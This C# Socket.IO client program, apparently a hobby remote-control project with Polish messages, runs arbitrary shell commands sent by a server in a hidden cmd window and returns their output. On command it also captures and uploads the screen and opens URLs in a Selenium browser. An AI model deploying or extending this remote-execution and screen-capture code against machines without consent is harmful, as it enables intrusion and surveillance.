using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using SocketIOClient;
using System.Threading.Tasks;
using System.Drawing.Imaging;
using OpenQA.Selenium;
using Octokit;

namespace VulcanClient2
{
    class Program
    {
        static void RunWebDriver(DriverManager driverManager, Uri url)
        {
            try
            {
                var driver = driverManager.SelectedDriver.GetDriver();
                driver.Navigate().GoToUrl(url);
            }
            catch (WebDriverException e)
            {
                Console.WriteLine(e);
            }
        }
        static async Task Main(string[] args)
        {
            Console.WriteLine("Vulcan Client");
            Console.OutputEncoding = Encoding.UTF8;

            var uri = new Uri("http://localhost:3000/clients");
            var socket = new SocketIO(uri);

            socket.OnConnected += Socket_OnConnected;
            socket.OnDisconnected += Socket_onDisconnected;

            socket.On("website", async response =>
            {
                DriverManager driverManager = new DriverManager();
                var currentDirectory = Directory.GetCurrentDirectory();
                string url = response.GetValue(0).Value<string>("url");
                Uri uri = new Uri(url);
                if (!File.Exists($"{currentDirectory}/drivers/{driverManager.SelectedDriver.Filename}"))
                {
                    Console.WriteLine("Driver nie istnieje");
                    await driverManager.SelectedDriver.DownloadDriver();
                    RunWebDriver(driverManager, uri);
                }
                else
                {
                    Console.WriteLine("Driver istnieje");
                    RunWebDriver(driverManager, uri);
                }

                await socket.EmitAsync("website", new
                {
                    notification = new
                    {
                        message = $"Pomyślnie uruchomiono strone {url}",
                        pos = "bottom-right",
                        status = "success"
                    }
                });
            });
            
            socket.On("command", async response =>
            {
                string cmd = "/C " + response.GetValue<string>();

                var process = new Process();
                var startInfo = new ProcessStartInfo();

                startInfo.FileName = "cmd";
                startInfo.Arguments = cmd;
                startInfo.CreateNoWindow = true;
                startInfo.UseShellExecute = false;
                startInfo.RedirectStandardOutput = true;
                startInfo.RedirectStandardError = true;
                startInfo.StandardErrorEncoding = Encoding.UTF8;
                startInfo.StandardOutputEncoding = Encoding.UTF8;

                process.StartInfo = startInfo;
                process.Start();
                process.WaitForExit();

                StreamReader reader = process.StandardOutput;
                StreamReader errorReader = process.StandardError;
                
                string cmdOutput = reader.ReadToEnd();
                string cmdError = errorReader.ReadToEnd();
                Console.WriteLine(process.StandardOutput.ReadToEnd());

                string output = cmdError != "" ? cmdError : cmdOutput;

                Console.WriteLine(output);

                await socket.EmitAsync("command", new
                {
                    message = output
                });
            });

            socket.On("screenshot", async response =>
            {
                ScreenShoot sc = new ScreenShoot();
                var imageBytes = sc.CaptureScreenToBytes(ImageFormat.Png);
                string filename = $"{Guid.NewGuid()}.png";
                await socket.EmitAsync("get_screenshoot", new
                {
                    img = imageBytes,
                    filename = filename
                });
            });
            
            await socket.ConnectAsync();
            Console.ReadLine();
        }

        private static void Socket_OnConnected(object sender, EventArgs e)
        {
            var socket = sender as SocketIO;
            Console.WriteLine("Klient polaczony " + socket.Id);
        }

        private static void Socket_onDisconnected(object sender, string e)
        {
            Console.WriteLine("Klient rozlaczony");
        }
    }
}